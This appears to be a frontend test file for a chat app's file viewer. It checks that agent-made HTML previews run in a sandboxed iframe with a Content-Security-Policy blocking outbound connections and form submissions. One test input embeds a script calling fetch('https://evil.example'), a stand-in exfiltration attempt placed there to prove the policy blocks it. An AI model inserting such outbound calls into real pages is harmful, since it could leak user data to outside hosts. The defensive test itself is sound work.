// @vitest-environment jsdom
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { FileContentRenderer } from "@/features/chat/components/artifacts/FileViewerBody";

// What a link holder's frame on the content origin runs under (short-link-public-pages.test.tsx).
const LINK_HOLDER_SANDBOX =
  "allow-scripts allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-downloads";

function frameOf(container: HTMLElement): HTMLIFrameElement {
  const frame = container.querySelector("iframe");
  if (!frame) throw new Error("no frame rendered");
  return frame;
}

function previewOwnerHtml(html: string): HTMLIFrameElement {
  const { container } = render(
    <FileContentRenderer
      content={html}
      contentType="text/html"
      filename="report.html"
      viewMode="preview"
    />,
  );
  return frameOf(container);
}

function cspOf(frame: HTMLIFrameElement): Element | null {
  const doc = new DOMParser().parseFromString(
    frame.getAttribute("srcdoc") ?? "",
    "text/html",
  );
  return doc.head.firstElementChild;
}

describe("agent-made HTML", () => {
  // Regression: the owner's panel framed the file with sandbox="" (inert) while a link holder ran it live.
  it("runs for its owner under the sandbox a link holder's frame uses", () => {
    const frame = previewOwnerHtml("<p>Q3</p><script>draw()</script>");

    expect(frame.getAttribute("sandbox")).toBe(LINK_HOLDER_SANDBOX);
    expect(frame.getAttribute("referrerpolicy")).toBe("no-referrer");
  });

  it("can send nothing anywhere from the owner's panel, even with a script ahead of its head", () => {
    const frame = previewOwnerHtml(
      "<html><script>fetch('https://evil.example')</script><head><title>x</title></head><body>hi</body></html>",
    );

    const csp = cspOf(frame);
    expect(csp?.getAttribute("http-equiv")).toBe("Content-Security-Policy");
    expect(csp?.getAttribute("content")).toContain("connect-src 'none'");
    expect(csp?.getAttribute("content")).toContain("form-action 'none'");
  });
});
